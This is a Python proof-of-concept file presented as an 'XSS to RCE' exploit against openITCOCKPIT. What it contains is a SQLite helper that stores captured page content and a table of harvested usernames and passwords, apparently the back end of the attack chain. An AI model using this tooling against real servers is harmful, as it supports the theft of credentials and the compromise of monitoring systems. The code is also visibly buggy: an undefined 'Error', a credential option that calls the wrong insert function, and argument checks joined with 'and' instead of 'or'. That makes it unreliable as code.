# Exploit Title: OpenitCockpit XSS to RCE - POC
# Date: 2021-08-14
# Exploit Author: Youssef B
# Tested against: OpenitCockpit

import sqlite3, argparse, os

def create_conn(db_file):
    conn = None
    
    try:
        conn = sqlite3.connect(db_file)
    except Error as e:
            print(e)
    return conn

def create_db(conn):
    createContentTable = """CREATE TABLE IF NOT EXISTS content (
            id integer PRIMARY KEY,
            location text NOT NULL,
            content blob);"""

    createCredsTable = """CREATE TABLE IF NOT EXISTS credentials (
            id integer PRIMARY KEY,
            username text NOT NULL,
            password text NOT NULL);"""
    
    try:
        c = conn.cursor()
        c.execute(createContentTable)
        c.execute(createCredsTable)
    except Error as e:
        print(e)

def insert_content(conn, params):
    insertContent = """INSERT INTO content(location, content) VALUES(?,?)"""

    c = conn.cursor()
    c.execute(insertContent, params)
    conn.commit()

    return c.lastrowid

def insert_creds(conn, params):
    insertCreds = """INSERT INTO credentials(username, password) VALUES(?,?)"""

    c = conn.cursor()
    c.execute(insertCreds, params)
    conn.commit()

    return c.lastrowid

def get_content(conn, location):
    c = conn.cursor()
    c.execute("SELECT content FROM content WHERE location=?", (location[0],))

    rows = c.fetchall()

    for row in rows:
        return row[0]

def get_locations(conn):
    c = conn.cursor()
    c.execute("SELECT location FROM content")

    rows = c.fetchall()

    for row in rows:
        print(row[0])
    
    return rows


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--create','-c', help='Create Database', action='store_true')
    group.add_argument('--insert','-i', help='Insert Content', action='store_true')
    group.add_argument('--insertCreds','-x', help='Insert Creds', action='store_true')
    group.add_argument('--get','-g', help='Get Content', action='store_true')
    group.add_argument('--getLocations','-l', help='Get all Locations', action='store_true')
    parser.add_argument('--location','-L')
    parser.add_argument('--content','-C')
    parser.add_argument('--username', '-U')
    parser.add_argument('--password', '-P')
    args = parser.parse_args()

    database = r"sqlite.db"
    conn = create_conn(database)
    
    if (args.create):
        print("[+] Creating Database")
        create_db(conn)
    
    elif (args.insert):
        if(args.location is None and args.content is None):
            parser.error("--insert requires --location, --content.")
        else:
            print("[+] Inserting Data")
            insert_content(conn, (args.location, args.content))
            conn.commit()
    
    elif (args.insertCreds):
        if(args.username is None and args.password is None):
            parser.error("--insert-creds requires --username, --password.")
        else:
            print("[+] Inserting Creds")
            insert_content(conn, (args.username, args.password))
            conn.commit()
    
    elif (args.get):
        if(args.location is None):
            parser.error("--get requires --location.")
        else:
            print("[+] Getting Content")
            print(get_content(conn, (args.location,)))
    
    if (args.getLocations):
            print("[+] Getting All Locations")
            print(get_locations(conn))
